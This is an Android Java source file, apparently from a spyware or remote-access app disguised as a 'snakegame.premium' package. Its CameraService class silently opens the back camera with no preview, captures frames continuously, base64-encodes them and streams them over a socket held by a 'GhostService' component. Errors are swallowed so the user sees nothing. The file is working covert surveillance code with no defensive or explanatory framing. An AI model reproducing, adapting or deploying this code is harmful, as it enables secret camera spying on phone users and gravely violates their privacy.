package com.snakegame.premium;

import android.content.Context;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.Size;
import android.view.Surface;
import java.nio.ByteBuffer;
import java.util.Arrays;

public class CameraService {
    private Context ctx;
    private HandlerThread thread;
    private Handler handler;
    private CameraDevice camera;
    private ImageReader reader;
    private boolean running = false;

    public CameraService(Context ctx) {
        this.ctx = ctx;
    }

    public void start() {
        if (running) return;
        running = true;
        thread = new HandlerThread("Camera");
        thread.start();
        handler = new Handler(thread.getLooper());
        try {
            CameraManager manager = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
            String camId = manager.getCameraIdList()[0]; // belakang
            manager.openCamera(camId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice cam) {
                    camera = cam;
                    startCapture();
                }
                @Override public void onDisconnected(CameraDevice cam) { cam.close(); }
                @Override public void onError(CameraDevice cam, int error) { cam.close(); }
            }, handler);
        } catch (Exception e) {}
    }

    private void startCapture() {
        try {
            CameraManager manager = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
            String camId = manager.getCameraIdList()[0];
            CameraCharacteristics chars = manager.getCameraCharacteristics(camId);
            StreamConfigurationMap map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            Size[] jpegSizes = map.getOutputSizes(ImageFormat.JPEG);
            int width = 640, height = 480;
            if (jpegSizes != null && jpegSizes.length > 0) {
                width = jpegSizes[0].getWidth();
                height = jpegSizes[0].getHeight();
            }
            reader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 2);
            reader.setOnImageAvailableListener(reader -> {
                Image img = reader.acquireLatestImage();
                if (img != null) {
                    ByteBuffer buffer = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buffer.remaining()];
                    buffer.get(bytes);
                    String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                    GhostService svc = GhostService.getInstance();
                    if (svc != null && svc.getSocket() != null) {
                        svc.getSocket().send("camera_frame", base64);
                    }
                    img.close();
                }
            }, handler);
            camera.createCaptureSession(Arrays.asList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
                @Override public void onConfigured(CameraCaptureSession session) {
                    try {
                        CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                        builder.addTarget(reader.getSurface());
                        session.setRepeatingRequest(builder.build(), null, handler);
                    } catch (Exception e) {}
                }
                @Override public void onConfigureFailed(CameraCaptureSession session) {}
            }, handler);
        } catch (Exception e) {}
    }

    public void stop() {
        running = false;
        if (camera != null) camera.close();
        if (thread != null) thread.quitSafely();
    }
}
